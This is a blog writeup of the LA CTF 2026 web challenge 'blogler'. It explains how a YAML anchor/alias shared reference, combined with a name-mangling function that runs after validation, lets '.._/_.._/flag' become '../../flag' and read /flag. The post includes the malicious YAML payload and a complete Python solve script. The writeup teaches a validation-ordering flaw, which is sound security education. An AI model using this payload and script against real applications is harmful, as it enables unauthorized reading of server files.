---
title: LA CTF 2026 - a web challenge writeup [blogler]
date: 2026-02-08 08:02
tags: ctf, writeup, security, web
---

## What is this challenge?

With web challenges, usually we have the comfort of the source code.

<br>

> They call me the blogler.

<br>

Blogler appeared to be a simple blogging platform built with Python (Flask). You can register an account, write blog posts, and customize your profile via a YAML configuration file. But our goal was to read the contents of `/flag` on the server - representing a supposedly secure file.

<br>

Upon first review, the app *does* check for path traversal attacks (the classic `../../` trick to escape a directory). But there's a subtle interaction between two YAML features and a string-processing function that allows us to sneak past the filter.

<br>

## Side note: What are YAML anchors and aliases?

YAML is a data format (like JSON, but slightly more human-readable). We know the basics - keys, values, lists. But YAML has a lesser-known feature: **anchors** and **aliases**.

<br>

### The Short Version

- An **anchor** (`&name`) marks a node so you can reuse it later.
- An **alias** (`*name`) is a reference back to that anchor - "use the same thing again."

<br>

```yaml
defaults: &defaults
  color: blue
  size: large

item1:
  <<: *defaults
  name: "Widget"
```

<br>

This is often used to avoid repeating yourself. Seems pretty harmless at first glance.

<br>

### Shared references in Python - I am the danger

Here's where it gets interesting. When Python's `yaml.safe_load()` parses a YAML file with anchors and aliases, it doesn't just *copy* the data - it makes both keys **point to the exact same object in memory**.

<br>

Think of it like this. In normal YAML without anchors:

<br>

```yaml
user:
  name: "alice"
blogs:
  - name: "alice"
```

<br>

Python creates **two separate dictionaries** that happen to contain the same text. Changing one doesn't affect the other.

<br>

But with anchors and aliases:

<br>

```yaml
user: &u
  name: "alice"
blogs:
  - *u
```

<br>

Python creates **one dictionary** and makes both `user` and `blogs[0]` point to it. They are literally the same object. If you change `user["name"]`, you've also changed `blogs[0]["name"]` - because they're the same thing.

<br>

You can verify this in a Python shell:

<br>

```python
import yaml

data = yaml.safe_load("""
user: &u
  name: alice
blogs:
  - *u
""")

print(data["user"] is data["blogs"][0])  # True - same object!

data["user"]["name"] = "bob"
print(data["blogs"][0]["name"])           # "bob" - it changed too!
```

<br>

This shared-reference behavior turned out to be the core of the exploit.

<br>

## How the App works - the validation function

Upon receiving a new YAML config, the server runs `validate_conf()`. It does two things **in order**:

<br>

1. **Loop through all blogs** and check that each blog's `name` field doesn't contain path traversal patterns like `../` or start with `/`. This is meant to prevent reading files outside the blogs directory.

<br>

2. **After the loop**, call `display_name()` on `conf["user"]["name"]` and **write the result back** into the config.

<br>

```python
# Step 1: Check each blog name for path traversal
for i, blog in enumerate(conf["blogs"]):
    file_name = blog["name"]
    if "../" in file_name or file_name.startswith("/") or ...:
        return "hacking attempt!"

# Step 2: Transform the user's display name (AFTER validation)
conf["user"]["name"] = display_name(conf["user"].get("name", ...))
```

<br>

### The `display_name()` function

This function takes a username, splits it on underscores, capitalizes each piece, and joins them back together:

<br>

```python
def display_name(username: str) -> str:
    return "".join(p.capitalize() for p in username.split("_"))
```

<br>

For a normal name like `"john_doe"`, this produces `"JohnDoe"`. Totally fine.

<br>

But what happens with a carefully crafted string like `".._/_.._/flag"`?

<br>

```
Split on "_":  ["..","/" , "..", "/flag"]
Capitalize:    ["..", "/", "..", "/flag"]   (no change - these don't start with letters)
Join:          "../../flag"
```
<br>

The underscores disappear, and suddenly we appear to have a classic path traversal string: `../../flag`.

<br>

## The solution

### Step 1 - Register a normal account

Just create a user so we have a session.

<br>

### Step 2 - Submit a malicious YAML config

We POST the following YAML to `/config`:

<br>

```yaml
user: &u
  name: ".._/_.._/flag"
  password: "exploitpass"
  title: "pwned"
blogs:
  - *u
```

<br>

The `&u` anchor on `user` and the `*u` alias in `blogs` means `conf["user"]` and `conf["blogs"][0]` are **the same Python dict**.

<br>

### Step 3 - Validation passes

The server checks `blogs[0]["name"]`, which is `".._/_.._/flag"`. This string:

<br>

- Does **not** contain `"../"` (it has `.._/` instead - the underscores break the pattern)
- Does **not** start with `"/"`
- Resolves to a path inside the blogs directory

<br>

All checks pass. The blog name looks safe.

<br>

### Step 4 - `display_name()` transforms the string

Now the server runs `display_name(".._/_.._/flag")`, which strips the underscores and produces `"../../flag"`. This result is written back:

<br>

```python
conf["user"]["name"] = "../../flag"
```

<br>

But remember - `conf["user"]` **is the same object** as `conf["blogs"][0]`. So this line also sets `conf["blogs"][0]["name"]` to `"../../flag"`.

<br>

The validation already happened. It's too late to catch this.

<br>

### Step 5 - Read the flag

When we visit `/blog/<username>`, the server reads the blog file:

<br>

```python
(blog_path / blog["name"]).read_text()
```

<br>

With `blog["name"]` now equal to `"../../flag"`, this resolves to:

<br>

```
/app/blogs/../../flag  →  /flag
```

<br>

The flag is rendered into the blog page, and we can read it. 

<br>

## This bug was not very obvious

This vulnerability requires three conditions to be met:

<br>

1. **YAML anchors creating shared references** - a feature many developers would not consider when parsing user input.
2. **Validation happening before mutation** - the blog names are checked *first*, and the name is transformed *after*. This appears intentional for the challege, although possible in real applications.
3. **A string transformation that converts an innocent string into a dangerous one** - `display_name()` does not look security critical, but such assumption is never safe.

<br>

Each piece is harmless on its own. But as it's often the case, the combination of harmless pieces creates a vulnerability.

<br>

## The solve script

<br>

```python
import http.cookiejar
import urllib.request
import urllib.parse
import sys
import re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

cj = http.cookiejar.CookieJar()

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    NoRedirect()
)

def post(path, data):
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(f"{BASE}{path}", data=encoded, method="POST")
    try:
        r = opener.open(req)
        return r.status, dict(r.headers), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()

def get(path):
    req = urllib.request.Request(f"{BASE}{path}")
    try:
        r = opener.open(req)
        return r.status, dict(r.headers), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()

USERNAME = "exploituser"
PASSWORD = "exploitpass"

# Step 1: Register
print(f"[*] Registering user '{USERNAME}'...")
code, _, body = post("/register", {"username": USERNAME, "password": PASSWORD})
print(f"    -> {code}")

PAYLOAD = """\
user: &u
  name: ".._/_.._/flag"
  password: "exploitpass"
  title: "pwned"
blogs:
  - *u
"""

print(f"[*] Uploading malicious config...")
code, hdrs, body = post("/config", {"config": PAYLOAD})
if code == 302:
    print(f"    -> Config accepted (redirect to {hdrs.get('Location', '?')})")
else:
    print(f"    -> FAILED: {code} {body[:300]}")
    sys.exit(1)

# Step 3: Verify the config was stored with the mutated name
print(f"[*] Fetching stored config...")
code, _, body = get("/config")
print(f"    -> Stored config:\n{body}")

# Step 4: View the blog to trigger the file read
print(f"[*] Fetching blog to read /flag...")
code, _, body = get(f"/blog/{USERNAME}")
if code == 200:
    # Extract flag from HTML response
    flag_match = re.search(r'(lactf\{[^}]+\})', body)
    if flag_match:
        print(f"\n[+] FLAG: {flag_match.group(1)}")
    else:
        print(f"\n[*] Blog page content (flag may be in here):")
        print(body)
else:
    print(f"    -> FAILED: {code} {body[:500]}")

```

